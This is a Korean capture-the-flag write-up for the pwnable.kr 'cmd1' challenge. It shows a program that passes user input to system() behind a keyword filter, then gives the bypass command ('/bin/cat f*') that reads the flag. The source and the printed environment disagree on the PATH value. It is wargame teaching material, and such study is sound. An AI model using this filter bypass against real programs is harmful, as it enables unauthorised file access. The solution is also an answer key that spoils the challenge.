# cmd1 - 1 pt

```text
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
```

## cmd1.c

```c
cmd1@ubuntu:~$ ls
cmd1  cmd1.c  flag
cmd1@ubuntu:~$ cat cmd1.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```

`argv[1]`으로 입력한 모든 명령을 `system` 함수로 실행을 한다. 여기서 웃긴점:

1. `PATH`를 `/thankyouverymuch`로 바꿔서 쉘 BUILT-IN 함수 외엔 사용할 수 있는 명령어가 없다.
2. `filter`함수로 `sh`, `flag`, `tmp`가 들어간 명령어를 못 쓰게 만든다.

하하, 이건 어쩌라는 건지 원... 뭘 이용할 수 있을까?

## cmd1의 PATH 환경변수를 보자

```c
cmd1@ubuntu:~$ ./cmd1 export
export HOME='/home/cmd1'
export LANG='en_US.UTF-8'
export LANGUAGE='en_US:'
export LOGNAME='cmd1'
export MAIL='/var/mail/cmd1'
export PATH='/fuckyouverymuch'
export PWD='/home/cmd1'
export SHELL='/bin/bash'
export SHLVL='1'
export SSH_CLIENT='14.50.190.132 14680 22'
export SSH_CONNECTION='14.50.190.132 14680 192.168.1.186 22'
export SSH_TTY='/dev/pts/28'
export TERM='xterm-256color'
export USER='cmd1'
export XDG_RUNTIME_DIR='/run/user/1025'
export XDG_SESSION_ID='32665'
export _='./cmd1'
cmd1@ubuntu:~$
```

실행 도중엔 `PATH` 환경변수를 `/fuckyouverymuch`로 바꿔서 실행한다. `PATH` 환경변수는 명령어를 찾을때 참고하는 디렉토리 절대경로를 담고 있다. `PATH`를 `/fuckyouverymuch`로 바꾼다는 것은 명령어를 쓰지 못하도록 하는 것이다...?

## 멍청이 바보 하 진짜 멍청이

`PATH` 환경변수를 쓸 수 없다는 말은 아예 프로그램은 못 쓰는게 아니라 그냥 편하게 참고를 못한다는 뜻이다. 그래서 그냥 명령어 절대경로를 명시해 `/bin/cat`으로 파일을 읽으면 된다ㅋ

```c
cmd1@ubuntu:~$ which cat
/bin/cat
cmd1@ubuntu:~$ ls
cmd1  cmd1.c  flag
cmd1@ubuntu:~$ ./cmd1 "/bin/cat f*"
mommy now I get what PATH environment is for :)
```